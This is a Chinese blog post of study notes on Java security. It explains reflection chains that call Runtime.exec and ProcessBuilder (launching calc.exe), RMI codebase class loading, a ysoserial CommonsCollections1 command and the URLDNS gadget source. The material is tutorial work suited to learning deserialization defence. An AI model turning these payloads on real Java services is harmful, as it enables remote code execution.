<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Java安全初步+CC1 | Pale</title><meta name="keywords" content="Java"><meta name="author" content="One"><meta name="copyright" content="One"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="反射 forName获取类的⽅法 newInstance实例化类对象的⽅法 getMethod获取函数的⽅法 invoke执行函数的⽅法 class.newInstance() 的作用就是调用这个类的无参构造函数，  使用 newInstance 总是不成功原因： 1. 你使用的类没有无参构造函数 2. 你使用的类构造函数是私有的比如Runtime   获取一个”类”(java.lang.Clas">
<meta property="og:type" content="article">
<meta property="og:title" content="Java安全初步+CC1">
<meta property="og:url" content="http://example.com/2023/05/13/Java%E5%AE%89%E5%85%A8%E5%88%9D%E6%AD%A5-CC1/index.html">
<meta property="og:site_name" content="Pale">
<meta property="og:description" content="反射 forName获取类的⽅法 newInstance实例化类对象的⽅法 getMethod获取函数的⽅法 invoke执行函数的⽅法 class.newInstance() 的作用就是调用这个类的无参构造函数，  使用 newInstance 总是不成功原因： 1. 你使用的类没有无参构造函数 2. 你使用的类构造函数是私有的比如Runtime   获取一个”类”(java.lang.Clas">
<meta property="og:locale" content="zh_CH">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2023-05-13T09:44:03.000Z">
<meta property="article:modified_time" content="2023-05-13T09:48:47.932Z">
<meta property="article:author" content="One">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/05/13/Java%E5%AE%89%E5%85%A8%E5%88%9D%E6%AD%A5-CC1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Java安全初步+CC1',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-05-13 17:48:47'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/sup.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pale" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pale</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Java安全初步+CC1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-05-13T09:44:03.000Z" title="Created 2023-05-13 17:44:03">2023-05-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-05-13T09:48:47.932Z" title="Updated 2023-05-13 17:48:47">2023-05-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Java安全初步+CC1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><blockquote>
<p><code>forName</code>获取类的⽅法</p>
<p><code>newInstance</code>实例化类对象的⽅法</p>
<p><code>getMethod</code>获取函数的⽅法</p>
<p><code>invoke</code>执行函数的⽅法</p>
<p><code>class.newInstance() </code>的作用就是调用这个类的无参构造函数，</p>
<ul>
<li>使用<code> newInstance</code> 总是不成功原因： 1. 你使用的类没有无参构造函数 2. 你使用的类构造函数是私有的比如Runtime</li>
</ul>
</blockquote>
<h4 id="获取一个”类”-java-lang-Class-的方式"><a href="#获取一个”类”-java-lang-Class-的方式" class="headerlink" title="获取一个”类”(java.lang.Class )的方式"></a>获取一个”类”(java.lang.Class )的方式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过</span><br><span class="line">obj.getClass() 来获取它的类</span><br><span class="line">Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接</span><br><span class="line">拿它的 class 属性即可。这个⽅法其实不属于反射。</span><br><span class="line">Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</span><br><span class="line">ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;) 类似的利用类加载机制，也可以获取 Class 对象</span><br></pre></td></tr></table></figure>

<p>⽤反射的⼀⼤⽬的，就是绕过某些沙盒。⽐如，上下⽂中如果只有Integer类型的 数字，我们如何获取到可以执⾏命令的Runtime类呢？也许可以这样（伪代 码）：<code> 1.getClass().forName(&quot;java.lang.Runtime&quot;)</code></p>
<h4 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h4><p><strong>除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用<code>forName</code>就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</strong></p>
<p><img src="image-20230510111918317.png" alt="image-20230510111918317"></p>
<p>Java的普通类<code> C1</code> 中支持编写内部类 <code>C2</code> ，而在编译的时候，会生成两个文件： <code>C1.class </code>和<code>C1$C2.class</code>，我们可以把他们看作两个无关的类，通过<code>Class.forName(&quot;C1$C2&quot;) </code>即可加载这个内部类。</p>
<p>类的初始化：</p>
<blockquote>
<p>forName函数的两个重载</p>
<p>Class.forName(className) // 等于 </p>
<p>Class.forName(className, true, currentLoader)</p>
<p>Java默认的 ClassLoader 就是根据类名来加载类， 这个类名是类完整路径，如 java.lang.Runtime</p>
<p>第二个参数就是是否初始化 </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class TrainPrint &#123;</span><br><span class="line"> &#123;</span><br><span class="line"> System.out.printf(&quot;Empty block initial %s\n&quot;, this.getClass());</span><br><span class="line"> &#125;</span><br><span class="line"> static &#123;</span><br><span class="line"> System.out.printf(&quot;Static initial %s\n&quot;, TrainPrint.class);</span><br><span class="line"> &#125;</span><br><span class="line"> public TrainPrint() &#123;</span><br><span class="line"> System.out.printf(&quot;Initial %s\n&quot;, this.getClass());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>⾸先调⽤的是 static {} ，其次是 {} ，最后是构造函数。 其中， static {} 就是在“类初始化”的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super() 后⾯， 但在当前构造函数内容的前⾯。 所以说， forName 中的 initialize=true 其实就是告诉Java虚拟机是否执⾏”类初始化“。</p>
</blockquote>
<p>ex:假设我们有如下函数，其中函数的参数name可控： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public void ref(String name) throws Exception &#123;</span><br><span class="line"> Class.forName(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们就可以编写⼀个恶意类，将恶意代码放置在 static {} 中。</p>
<p>Runtime类就是单例模式，我们只能通过 <code>Runtime.getRuntime() </code>来获取到<code>Runtime</code>对 象。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">clazz.getMethod(&quot;exec&quot;,String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>getMethod 的作用是通过反射获取一个类的某个特定的公有方法。</p>
<p>调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表。这个类型得自己知道</p>
<p><img src="image-20230510133041282.png" alt="image-20230510133041282"></p>
<p>invoke 的作用是执行方法，它的第一个参数是： 如果这个方法是一个普通方法，那么第一个参数是类对象 如果这个方法是一个静态方法，那么第一个参数是类 我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Object runtime = getRuntimeMethod.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime, &quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>



<p><code>getConstructor </code>和<code>getMethod</code>类似， </p>
<p><code>getConstructor </code>接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。 获取到构造函数后，我们使用 <code>newInstance </code>来执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">((ProcessBuilder)</span><br><span class="line">clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))).start();</span><br></pre></td></tr></table></figure>

<p><code>ProcessBuilder</code>有两个构造函数：</p>
<blockquote>
<p>public ProcessBuilder(List command) </p>
<p>public ProcessBuilder(String… command) </p>
</blockquote>
<p>我上面用到了第一个形式的构造函数，所以我在 <code>getConstructor </code>的时候传入的是 <code>List.class</code> 。 </p>
<p>Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表达式上下文中）是没有这种语法的。</p>
<p>所以，仍需利用反射来完成这一步。 </p>
<p>通过 <code>getMethod(&quot;start&quot;) </code>获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;)));</span><br></pre></td></tr></table></figure>



<p>如果我们要使用<code>public ProcessBuilder(String... command)</code>这个构造函数</p>
<p>又涉及到Java里的<strong>可变长参数</strong>（varargs）了。</p>
<p>正如其他语言一样，Java也支持可变长参数，就是当你 定义函数的时候不确定参数数量的时候，可以使用 … 这样的语法来表示“这个函数的参数个数是可变 的”。 对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价 的（也就不能重载）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public void hello(String[] names) &#123;&#125;</span><br><span class="line">public void hello(String...names) &#123;&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。<br>所以，我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二<br>种构造函数<br>Class clazz = Class.forName(“java.lang.ProcessBuilder”);<br>clazz.getConstructor(String[].class)<br>在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给<br>ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][ &#123;&#123;&quot;calc.exe&quot;&#125;&#125;)).start();</span><br></pre></td></tr></table></figure>

<p>全反射写法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz1 = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">clazz1.getMethod(&quot;start&quot;).invoke(clazz1.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;&quot;calc.exe&quot;&#125;&#125;));</span><br></pre></td></tr></table></figure>







<p><code>declared</code>系列</p>
<p>与普通的 getMethod 、 getConstructor 区别是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </span><br><span class="line"></span><br><span class="line">getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</span><br></pre></td></tr></table></figure>

<p>个人感觉区别就是 不包含继承来的就是</p>
<p>而<code>getConstructor </code>接收的参数是构造函数列表类型</p>
<p>Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来 获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令：</p>
<blockquote>
<p>setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(true);</span><br><span class="line">clazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>





<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>远程方法调用  通过  java实现的RPC</p>
<p><img src="image-20230510140110732.png" alt="image-20230510140110732"></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14280278.html">https://www.cnblogs.com/nice0e3/p/14280278.html</a></p>
<p>一个RMI过程有以下三个参与者： </p>
<p><code>RMI Registry </code></p>
<p><code>RMI Server </code></p>
<p><code>RMI Client</code></p>
<p>Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。 不过list和lookup方法可以远程调用。 list方法可以列出目标上所有绑定的对象：</p>
<p>lookup作用就是获得某个远程对象。</p>
<h4 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用codebase执行任意代码</h4><p>RMI中也存在远程加载的场景，也会涉及到codebase。 </p>
<p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。 </p>
<p>如果我们指定 codebase=<a href="http://example.com/">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，则 Java虚拟机会下载这个文件 <a href="http://example.com/org/vulhub/example/Example.class">http://example.com/org/vulhub/example/Example.class</a> ，并作为 Example类的字节码。 </p>
<p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载codebase中的类。</p>
<p>如果codebase被控制，就可以加载恶意类，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去 CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p>
<p>只有满足如下条件的RMI服务器才能被攻击： </p>
<p>条件较苛刻</p>
<blockquote>
<p>安装并配置了SecurityManager </p>
<p>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</p>
<p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。</p>
</blockquote>
<p>0xaced开头  java序列化数据</p>
<p>codebase 是通过 [Ljava.rmi.server.ObjID; 的 classAnnotations 传递的</p>
<p>即使没有RMI的客户端，只需要修改 classAnnotations 的值，就能控制codebase，使其 指向攻击者的恶意网站。</p>
<blockquote>
<p>classAnnotations</p>
<p>在序列化Java类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法 annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写 这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用</p>
<p>分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的 内容</p>
</blockquote>
<h3 id="yoserial"><a href="#yoserial" class="headerlink" title="yoserial"></a>yoserial</h3><p>yoserial:可以让⽤户根据⾃⼰选择的利⽤链，⽣成反 序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令。</p>
<p>什么是利⽤链？ 利⽤链也叫“gadget chains”，我们通常称为gadget。可以将 gadget理解为⼀种⽅法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能 是 <code>__desctruct</code> 到 <code>eval</code> ；如果你没学过其他语⾔的反序列化漏洞，那么gadget就是⼀种⽣成POC的⽅法罢了</p>
<p><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</code></p>
<h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><blockquote>
<p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p>
<p>⾮常适合我们在检测反序列化漏洞时 使⽤： </p>
<ul>
<li>使⽤Java内置的类构造，对第三⽅库没有依赖 </li>
<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ul>
</blockquote>
<h4 id="代码层分析"><a href="#代码层分析" class="headerlink" title="代码层分析"></a>代码层分析</h4><p>yoserial中 URLDNS代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到<code>return ht</code>就是得到的payload </p>
